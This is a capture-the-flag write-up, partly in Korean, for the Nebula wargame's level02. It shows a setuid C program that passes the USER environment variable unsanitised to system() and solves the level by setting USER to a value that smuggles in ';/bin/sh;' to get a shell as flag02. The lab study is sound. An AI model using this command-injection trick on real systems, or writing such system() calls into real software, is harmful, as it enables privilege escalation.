# Level 02

## Plot

### About

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

`asprintf`는 `sprintf`의 변형 버전으로, 1번째 인자로 주어진 포인터에 2번째 인자로 주어지는 문자열을 넣는다. 2번째 인자의 문자열의 포맷에 따라 추가적인 인자가 주어질 수 있다.

## USER 환경변수를 조작하자

간단하게 생각해서 `buffer`에 `USER` 환경변수 값을 넣고 그대로 `system`함수에 넣어 실행하니까 `;`로 `/bin/sh`을 실행 시켜주자.

```text
level02@nebula:/home/flag02$ USER="flag02;/bin/sh;"
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo flag02;/bin/sh; is cool")
flag02
sh-4.2$ whoami
flag02
sh-4.2$ getflag
You have successfully executed getflag on a target account
```